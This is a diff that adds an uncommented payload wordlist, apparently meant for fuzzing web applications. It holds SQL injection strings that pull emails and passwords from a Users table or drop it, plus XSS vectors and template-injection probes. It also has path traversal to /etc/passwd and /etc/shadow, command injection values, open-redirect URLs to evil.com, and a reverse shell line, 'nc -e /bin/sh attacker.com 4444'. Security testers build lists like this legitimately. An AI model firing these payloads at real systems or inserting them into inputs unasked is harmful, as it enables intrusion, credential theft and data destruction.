@@ -1,0 +1,173 @@
+test
+1
+admin
+
+'
+"
+`
+'--
+'--
+"--
+`)--
+'))--
+')) OR 1=1--
+')) OR 1=2--
+')) AND 1=1--
+')) AND 1=2--
+')) ORDER BY 1--
+')) ORDER BY 10--
+')) UNION SELECT NULL--
+')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+')) UNION SELECT * FROM Users--
+')) UNION SELECT email,password FROM Users--
+')) UNION SELECT id,email,password,1,1,1,1,1,1 FROM Users--
+')) UNION SELECT username,password FROM Users--
+qwert'))--
+qwert')) UNION SELECT id,email,password,1,1,1,1,1,1 FROM Users--
+' or 1=1--
+' or 1=2--
+' or '1'='1
+' or '1'='2
+" or 1=1--
+" or "1"="1
+1' AND '1'='1
+1' AND '1'='2
+1 OR 1=1
+1 OR 1=2
+1' OR '1'='1'--
+1' UNION SELECT NULL--
+admin'--
+admin' or '1'='1
+admin'--
+or 1=1
+or 1=1--
+OR 1=1
+UNION SELECT
+UNION ALL SELECT
+UNION SELECT NULL--
+UNION SELECT 1,2,3,4,5,6,7,8,9--
+; DROP TABLE Users--
+'; DROP TABLE Users--
+1; DROP TABLE Users--
+' AND 1=1--
+' AND 1=2--
+'; WAITFOR DELAY '0:0:5'--
+' OR SLEEP(5)--
+' OR pg_sleep(5)--
+1))-- 
+))--
+)) OR 1=1--
+)) UNION SELECT--
+%00
+%0a
+%0d
+%27
+%22
+%60
+%2527
+%2522
+\' 
+\"
+\' OR 1=1--
+\'; DROP TABLE Users--
+
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+"><svg/onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+{{7*7}}
+{{7*'7'}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+{{config}}
+{{''.__class__.__mro__}}
+{{request}}
+${{7*7}}
+
+../../etc/passwd
+..%2f..%2fetc%2fpasswd
+..%252f..%252fetc%252fpasswd
+....//....//etc/passwd
+/etc/passwd
+/etc/shadow
+/etc/hosts
+C:\Windows\System32\drivers\etc\hosts
+..\..\Windows\System32\drivers\etc\hosts
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%c0%af..%c0%afetc%c0%afpasswd
+..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+
+; id
+| id
+|| id
+&& id
+& id
+`id`
+$(id)
+; whoami
+| whoami
+; cat /etc/passwd
+| cat /etc/passwd
+; ls -la
+| ls -la
+`ls -la`
+$(ls -la)
+; nc -e /bin/sh attacker.com 4444
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+& ping -n 5 127.0.0.1
+
+http://evil.com
+//evil.com
+https://evil.com
+//evil.com/%2F..
+http://evil.com@target.com
+http://target.com.evil.com
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+http://[::]:80/
+\\evil.com
+/\/evil.com
+http://evil.com#target.com
+http://evil.com?target.com
+
+true
+false
+null
+undefined
+0
+-1
+-99999
+9999999999999999999
+2147483647
+2147483648
+NaN
+Infinity
+-Infinity
+[]
+{}
+[]
+""
+''
+' OR ''='
+' OR 'a'='a
+' OR 'a'='b
+' OR 1=1 or ''='
+' OR 1=1 or 'x'='y
+admin' or '1'='1'--
+admin' or '1'='2'--
+') or ('1'='1
+') or ('1'='2
+' || '1'='1
+' || '1'='2
+1' and '1'='1
+1' and '1'='2
